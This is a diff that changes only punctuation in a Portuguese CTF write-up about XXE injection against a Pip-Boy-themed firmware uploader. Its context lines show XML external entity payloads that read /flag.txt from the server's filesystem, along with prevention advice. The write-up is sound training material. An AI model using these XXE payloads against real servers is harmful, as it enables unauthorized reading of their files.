@@ -5,7 +5,7 @@ category: "Web"
 difficulty: "Very Easy"
 date: 2025-08-15
 techniques: ["XXE Injection", "Local File Inclusion", "XML Parsing"]
-description: "Injeção XXE em um uploader de firmware ROM tematizado em Pip-Boy (Fallout) — leitura do /flag.txt no filesystem do servidor via entidades XML externas."
+description: "Injeção XXE em um uploader de firmware ROM tematizado em Pip-Boy (Fallout), leitura do /flag.txt no filesystem do servidor via entidades XML externas."
 lang: pt-br
 translation_key: jailbreak
 permalink: /writeups/jailbreak/pt/
@@ -42,7 +42,7 @@ O servidor faz parsing do XML enviado pelo usuário sem desabilitar entidades ex
 
 ## Exploração
 
-### Tentativa 1 — Com declaração de encoding
+### Tentativa 1. Com declaração de encoding
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
@@ -50,7 +50,7 @@ O servidor faz parsing do XML enviado pelo usuário sem desabilitar entidades ex
 ```
 **Resultado:** Servidor rejeitou a declaração de encoding.
 
-### Tentativa 2 — Entidade no campo Description
+### Tentativa 2. Entidade no campo Description
 ```xml
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
 <FirmwareUpdateConfig>
@@ -58,9 +58,9 @@ O servidor faz parsing do XML enviado pelo usuário sem desabilitar entidades ex
     <Description>&xxe;</Description>
     ...
 ```
-**Resultado:** Sem retorno — o campo Description não é refletido na resposta.
+**Resultado:** Sem retorno, o campo Description não é refletido na resposta.
 
-### Tentativa 3 — Entidade em múltiplos campos (SUCESSO)
+### Tentativa 3. Entidade em múltiplos campos (SUCESSO)
 ```xml
 <!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "file:///flag.txt">
@@ -89,8 +89,8 @@ O campo **Version** foi refletido na mensagem de resposta do servidor.
 
 ## Principais Aprendizados
 
-- **Entrada XML = testar XXE** — é quase um reflexo em segurança web
-- **Nem todo campo reflete saída** — testar `&xxe;` em vários campos simultaneamente
+- **Entrada XML = testar XXE**, é quase um reflexo em segurança web
+- **Nem todo campo reflete saída**, testar `&xxe;` em vários campos simultaneamente
 - **Remover a declaração `<?xml?>`** se o servidor rejeitar
 - **`SYSTEM "file:///"` lê arquivos locais** através do parser XML
 - Prevenção: desabilitar DTDs e entidades externas no parser XML
